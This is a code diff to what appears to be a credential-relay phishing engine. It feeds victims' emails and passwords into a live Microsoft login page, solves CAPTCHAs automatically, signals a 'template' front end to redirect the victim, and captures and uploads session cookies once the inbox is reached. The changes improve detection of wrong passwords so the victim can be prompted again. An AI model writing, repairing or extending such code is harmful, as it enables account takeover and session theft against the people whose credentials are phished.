@@ -27,7 +27,9 @@ import {
     solveRecaptchaChallengeWithAI,
     activelyProcessing,
     isTemplateAlive,
-    verifyPageStillValid
+    verifyPageStillValid,
+    detectPasswordError,
+    stillOnPasswordPage
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
@@ -1116,6 +1118,14 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                             }
                                         }
                                     }
+                                    // Check for login failure FIRST — a wrong password on the newer Microsoft
+                                    // login page renders an inline error (#passwordError / has-error) while the
+                                    // URL stays the same and the password input stays visible. That must be
+                                    // classified as WAITINGPASSWORD_ERROR, NOT the generic "wrong button" below.
+                                    if (await detectPasswordError(page, platformConfig)) {
+                                        logger.info(`[checkAccountAccess][${instanceId}] Password incorrect. Returning WAITINGPASSWORD_ERROR.`);
+                                        return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
+                                    }
                                     // Verify page actually changed after click — if URL is the same and password input still visible, wrong button was clicked
                                     const urlAfterPasswordSubmit = page.url();
                                     const pwStillVisible = await page.evaluate((sels) => {
@@ -1126,21 +1136,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                     if (!urlChanged && pwStillVisible) {
                                         logger.warn(`[checkAccountAccess][${instanceId}] Password next button clicked but page did not change (URL same, password input still visible). Wrong button may have been clicked.`);
                                         return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD', message: "Password submit button did not work. Please try again." };
-                                    }
-                                    // Check for login failure
-                                    if (platformConfig.selectors.loginFailed) {
-                                        const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ? platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
-                                        for (const sel of loginFailedSelectors) {
-                                            if (typeof sel === 'string') {
-                                                const failExists = await page.evaluate((xpath) => {
-                                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
-                                                }, sel).catch(() => false);
-                                                if (failExists) {
-                                                    logger.info(`[checkAccountAccess][${instanceId}] Password incorrect. Returning WAITINGPASSWORD_ERROR.`);
-                                                    return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
-                                                }
-                                            }
-                                        }
                                     }
                                     // Check for verification screens
                                     const verificationDetails = await checkVerification(page, platformConfig);
@@ -2745,22 +2740,30 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                                 // **CRITICAL**: Check for login failed (incorrect password) BEFORE the URL-change
                                 // check, because a wrong password can render an inline error without navigating.
+                                // The newer Microsoft login page (login-paginated-password-view) renders the
+                                // wrong-password error (#passwordError / .has-error) ASYNCHRONOUSLY after the
+                                // submit round-trip — sometimes even re-rendering the password view after a
+                                // URL change. So poll for a bounded window rather than checking once, and
+                                // stop early once the page has genuinely left the password view.
                                 let passwordFailedDetected = false;
-                                if (platformConfig.selectors.loginFailed) {
-                                    const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ?
-                                        platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
-                                    for (const selector of loginFailedSelectors) {
-                                        if (typeof selector === 'string') {
-                                            const failExists = await page.evaluate((xpath) => {
-                                                try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
-                                            }, selector).catch(() => false);
-                                            if (failExists) {
-                                                logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
-                                                passwordFailedDetected = true;
-                                                break;
-                                            }
-                                        }
+                                const passwordErrorPollDeadline = Date.now() + 15000;
+                                while (Date.now() < passwordErrorPollDeadline) {
+                                    if (await detectPasswordError(page, platformConfig)) {
+                                        logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
+                                        passwordFailedDetected = true;
+                                        break;
                                     }
+                                    // Successful submit = password view gone (input no longer visible on a
+                                    // login URL). Stop polling early so legit logins don't burn the window.
+                                    const leftPasswordView = await stillOnPasswordPage(page, platformConfig);
+                                    if (!leftPasswordView) {
+                                        logger.debug(`[processRow][${browserId}] Password view no longer visible after submit — assuming submit processed.`);
+                                        break;
+                                    }
+                                    await new Promise(res => setTimeout(res, 1000));
+                                }
+                                if (!passwordFailedDetected) {
+                                    logger.debug(`[processRow][${browserId}] No password-error marker found within ${15000}ms poll (or password view left).`);
                                 }
 
                                 // NOTE: No "page did not change" revert here. After Enter (or the button
@@ -2806,6 +2809,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             viewName: verificationDetails.viewName
                                         };
                                     } else {
+                                        // HARD GATE: even though the poll above found no error, re-check right
+                                        // before writing PROCESSING_FINALIZING. The newer Microsoft login page can
+                                        // render the wrong-password error AFTER the initial poll window. Never
+                                        // finalize (→ COMPLETED) while the page is still showing the password view.
+                                        const gateErrorNow = await detectPasswordError(page, platformConfig);
+                                        if (gateErrorNow) {
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Password-error marker present at finalize time. Treating as incorrect password — NOT finalizing.`);
+                                            initialCheckResult = {
+                                                emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
+                                            };
+                                        } else if (await stillOnPasswordPage(page, platformConfig)) {
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Still on password view at finalize time. Treating as not-accepted — NOT finalizing.`);
+                                            initialCheckResult = {
+                                                emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Password submit did not leave the password view. Please try again."
+                                            };
+                                        } else {
                                         // Password accepted — write PROCESSING_FINALIZING to cache immediately (no Sheets cascade)
                                         // so template redirects user while engine waits for inbox, captures cookies, and uploads
                                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password accepted. Sending PROCESSING_FINALIZING to template immediately.`);
@@ -2842,11 +2863,28 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             await new Promise(resolve => setTimeout(resolve, 5000));
                                         }
                                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox reached: ${inboxReached}`);
-                                        finalStatus = "PROCESSING_FINALIZING";
-                                        initialCheckResult = {
-                                            emailExists: true, accountAccess: true, reachedInbox: inboxReached, requiresVerification: false, verificationState: null
-                                        };
+                                        // SECOND HARD GATE: if the direct inbox navigation bounced back to the
+                                        // login page (wrong password re-renders the password view), never mark
+                                        // PROCESSING_FINALIZING. Check AFTER the inbox loop because the error can
+                                        // render after the redirect round-trip.
+                                        let postInboxStillOnPasswordView = false;
+                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await stillOnPasswordPage(page, platformConfig))) {
+                                            postInboxStillOnPasswordView = true;
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] After inbox attempt, page is back on the password view/error. Treating as incorrect password — NOT finalizing.`);
+                                        }
+                                        if (postInboxStillOnPasswordView) {
+                                            initialCheckResult = {
+                                                emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
+                                            };
+                                        } else {
+                                            finalStatus = "PROCESSING_FINALIZING";
+                                            initialCheckResult = {
+                                                emailExists: true, accountAccess: true, reachedInbox: inboxReached, requiresVerification: false, verificationState: null
+                                            };
+                                        }
                                     }
+                                }
                                 }
 
                                 // If a password attempt resulted in a password-specific failure or accountAccess=false,
